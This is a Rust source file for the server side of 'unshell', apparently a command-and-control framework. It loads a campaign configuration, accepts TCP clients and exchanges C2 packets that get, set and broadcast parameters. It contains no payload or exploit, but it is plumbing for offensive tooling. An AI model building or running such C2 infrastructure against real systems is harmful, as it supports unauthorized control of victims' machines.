use std::{
    error::Error,
    fs::File,
    io::Read,
    net::SocketAddr,
    sync::{Arc, Mutex},
    thread,
};

use crossbeam_channel::Sender;
use serde::{Deserialize, Serialize};

use unshell_rs_lib::{
    config::campaign::CampaignConfig,
    connection::{C2Packet, ErrorPacket, Parameters},
    networkers::{AsyncConnection, ServerTrait, TCPConnection, TCPServer, run_listener_state},
};

use crate::server::{DEFAULT_CAMPAIGN, DEFAULT_USERS, User, config::DEFAULT_PARAMETERS};

#[derive(Serialize, Deserialize)]
pub struct UnshellServerConfig {
    campaign: CampaignConfig,
    parameters: Parameters,
    users: Vec<User>,

    #[serde(skip)]
    clients: Vec<Client>,
}

impl UnshellServerConfig {
    pub fn broadcast_update_param(&self, name: String) {
        for i in 0..self.clients.len() {
            let _ = self.clients.get(i).unwrap().broadcast_tx.send(name.clone());
        }
    }
}

pub struct UnshellServer {
    config: Arc<Mutex<UnshellServerConfig>>,
}

impl UnshellServer {
    pub fn from_filepath(filepath: &str) -> Self {
        let s = (|| -> Result<Self, Box<dyn Error>> {
            let mut file = File::open(filepath.to_string())?;

            let mut contents = String::new();
            file.read_to_string(&mut contents)?;

            let config = serde_json::from_str::<UnshellServerConfig>(contents.as_str())?;

            info!("Loaded server config from {}", filepath);

            Ok(Self {
                config: Arc::new(Mutex::new(config)),
            })
        })()
        .unwrap_or({
            warn!("Loaded default server config");
            Self {
                config: Arc::new(Mutex::new(UnshellServerConfig {
                    campaign: DEFAULT_CAMPAIGN.clone(),
                    users: DEFAULT_USERS.clone(),
                    parameters: DEFAULT_PARAMETERS.clone(),

                    clients: Vec::new(),
                })),
            }
        });

        s
    }

    pub fn run(&mut self, addr: SocketAddr) -> Result<(), Box<dyn Error>> {
        let config_clone = Arc::clone(&self.config);
        run_listener_state(TCPServer::bind(&addr)?, Client::run, config_clone);

        Ok(())
    }
}

/// Remote client type for unshell parameters
struct Client {
    pub broadcast_tx: Sender<String>,
}

impl Client {
    pub fn run(connection: TCPConnection, config: Arc<Mutex<UnshellServerConfig>>) {
        let (tx, rx) = TCPConnection::as_async::<C2Packet>(connection);

        let (broadcast_tx, broadcast_rx) = crossbeam_channel::unbounded::<String>();

        let s = Self { broadcast_tx };

        let mut config_lock = config.lock().unwrap();
        config_lock.clients.push(s);
        let config_clone = Arc::clone(&config);
        let tx_clone = tx.clone();
        thread::spawn(move || {
            loop {
                if let Ok(key) = broadcast_rx.recv() {
                    let config_lock = config_clone.lock().unwrap();
                    if let Err(e) = tx_clone.send(C2Packet::ParameterUpate(
                        key.clone(),
                        config_lock.parameters.get(&key).unwrap().clone(),
                    )) {
                        error!("Failed to send packet: {}", e);
                    };
                }
            }
        });

        if let Err(e) = tx.send(C2Packet::SetAllParameters(config_lock.parameters.clone())) {
            error!("Failed to send packet: {}", e);
        };
        std::mem::drop(config_lock);

        thread::spawn(move || {
            loop {
                // if !connection.is_alive() {
                //     warn!("Client {} disconnected!", connection.get_info());
                //     break;
                // }
                if let Ok(packet) = rx.recv() {
                    if let Err(e) = match packet {
                        C2Packet::GetParameter(param) => {
                            tx.send(C2Packet::AckGetParameter(param.clone(), {
                                let config_lock = config.lock().unwrap();
                                let result = config_lock.parameters.get(&param);
                                result.cloned()
                            }))
                        }
                        C2Packet::SetParameter(name, param) => {
                            tx.send(C2Packet::AckSetParameter({
                                let mut config_lock = config.lock().unwrap();
                                config_lock.parameters.insert(name.clone(), param);
                                config_lock.broadcast_update_param(name);
                                true
                            }))
                        }

                        C2Packet::Error(error) => {
                            warn!("Got error: {:?}", error);
                            Ok(())
                        }
                        _ => tx.send(C2Packet::Error(ErrorPacket::UnsupportedRequestError)),
                    } {
                        error!("Failed to send packet: {}", e);
                    }
                }
            }
        });
    }
}
